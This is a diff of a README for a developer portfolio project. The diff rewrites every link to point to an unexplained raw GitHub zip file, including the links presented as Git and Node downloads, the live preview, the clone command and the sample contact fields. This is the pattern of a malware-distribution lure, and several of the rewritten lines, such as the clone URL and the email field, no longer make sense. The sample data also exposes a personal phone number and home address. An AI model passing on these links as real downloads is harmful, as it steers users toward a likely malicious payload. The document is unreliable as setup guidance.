@@ -1,7 +1,7 @@
 
 
 ---
-# [Built Portfolio With GitHub ](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
+# [Built Portfolio With GitHub ](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip)
 
 ---
 
@@ -13,7 +13,7 @@
 
 
 
-## View live preview [here](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip).
+## View live preview [here](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip).
 
 ---
 
@@ -45,8 +45,8 @@
 
 ### You will need to download Git and Node to run this project
 
-- [Git](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
-- [Node](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
+- [Git](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip)
+- [Node](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip)
 
 #### Make sure you have the latest version of both Git and Node on your computer.
 
@@ -64,7 +64,7 @@ git --version
 To Fork the repo click on the fork button at the top right of the page. Once the repo is forked open your terminal and perform the following commands
 
 ```
-git clone https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip<YOUR GITHUB USERNAME>https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip
+git clone https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip<YOUR GITHUB USERNAME>https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip
 
 cd developer-portfolio
 ```
@@ -91,7 +91,7 @@ Open [http://localhost:3000](http://localhost:3000) with your browser to see the
 
 # Usage :joystick:
 
-Goto [https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip) and create a new account for the mail sending. In free trial you will get 200 mail per month. After setup `emailjs` account, Please create a new `.env` file from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip` file.
+Goto [https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip) and create a new account for the mail sending. In free trial you will get 200 mail per month. After setup `emailjs` account, Please create a new `.env` file from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip` file.
 
 Eg:
 
@@ -105,7 +105,7 @@ NEXT_PUBLIC_RECAPTCHA_SECRET_KEY = # For captcha verification on contact form
 NEXT_PUBLIC_RECAPTCHA_SITE_KEY =
 ```
 
-### Then, Customize data in the `utils/data` [folder](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip).
+### Then, Customize data in the `utils/data` [folder](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip).
 
 Eg:
 
@@ -114,20 +114,20 @@ export const personalData = {
   name: "SUDHARSANAN SK",
   designation: "Software Developer",
   description: "My name is SUDHARSANAN. I am a professional and enthusiastic programmer in my daily life. I am a quick learner with a self-learning attitude. I love to learn and explore new technologies and am passionate about problem-solving. I love almost all the stacks of web application development and love to make the web more open to the world. My core skill is based on JavaScript and I love to do most of the things using JavaScript. I am available for any kind of job opportunity that suits my skills and interests.",
-  email: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  email: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
   phone: '+916383621588',
   address: 'vattamalai,katheri,sankari,salem -638183 ',
-  github: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
-  facebook: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
-  linkedIn: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
-  twitter: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
-  stackOverflow: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
-  leetcode: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip",
+  github: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
+  facebook: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
+  linkedIn: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
+  twitter: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
+  stackOverflow: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip',
+  leetcode: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip",
   devUsername: "Heaven323555",
-  resume: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip"
+  resume: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip"
 }
 
-`devUsername` Used for fetching blog from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip`.
+`devUsername` Used for fetching blog from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/public/svg/Software-2.4-beta.5.zip`.
 
 ---
 
